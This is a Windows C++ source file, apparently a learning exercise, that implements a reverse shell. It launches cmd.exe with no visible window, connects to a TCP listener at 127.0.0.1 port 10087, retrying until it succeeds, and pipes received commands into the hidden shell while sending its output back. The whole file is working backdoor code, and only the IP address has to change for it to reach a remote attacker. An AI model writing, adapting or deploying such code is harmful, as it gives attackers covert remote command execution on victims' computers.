// cmd.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include<iostream>
#include<WinSock2.h>
#include<Windows.h>
#pragma comment(lib,"ws2_32.lib")
using namespace std;


int main()
{
    bool ret;

    HANDLE myhwritepipe;
    HANDLE cmdhreadpipe;

    HANDLE cmdhwritepipe;
    HANDLE myhreadpipe;

    SECURITY_ATTRIBUTES sa = { 0 };
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;


    ret = CreatePipe(&cmdhreadpipe, &myhwritepipe, &sa, 0);
    ret = CreatePipe(&myhreadpipe, &cmdhwritepipe, &sa, 0);


    STARTUPINFO st = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    //TCHAR a[] = TEXT("/c calc");

    st.cb = sizeof(STARTUPINFO);
    st.dwFlags = STARTF_USESTDHANDLES;
    st.hStdInput = cmdhreadpipe;
    st.hStdOutput = cmdhwritepipe;
    st.hStdError = cmdhwritepipe;

    ret = CreateProcess(TEXT("C:\\Windows\\System32\\cmd.exe"),
        NULL,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &st,
        &pi
        );



    WORD wVersionRequested;
    WSADATA wsaData;
    int err;

    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested, &wsaData);
    if (err != 0) {
        /* Tell the user that we could not find a usable */
        /* WinSock DLL.                                  */
        return 0;
    }

    //1.socket
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);

    while (true)
    {
        //1.socket
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        //2.connet
        sockaddr_in addr;
        int length = sizeof(sockaddr_in);
        addr.sin_family = AF_INET;


        addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(10087);


        while (true)
        {
            int isconncet = connect(s, (sockaddr*)&addr, length);
            if (isconncet == 0) break;
            Sleep(300);
        }
        cout << endl << "---------连接成功!!!!-------------" << endl;
        Sleep(1000);
        system("cls");

        //4.send/recv
        

        int getdate;
        while (true)
        {
            char rbuf[256] = { 0 };
            getdate = recv(s, rbuf, 256, 0);
            if (getdate > 0)
            {

                DWORD realwlength;
                DWORD wlength = strlen(rbuf);
                rbuf[wlength++] = '\n';
                WriteFile(myhwritepipe, rbuf, wlength, &realwlength, NULL);
                

                while (TRUE)
                {
                    Sleep(100);
                    DWORD isnull = 0;
                    ret = PeekNamedPipe(myhreadpipe, 0, 1, &isnull, 0, 0);
                    if (!isnull)  break;

                    char backdata[256] = {0};
                    DWORD realrlength;
                    ReadFile(myhreadpipe, backdata, 255, &realrlength, NULL);
                    send(s, backdata, 255, 0);

                }
            }
            else
            {     
                break;
            }
        }
    }
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
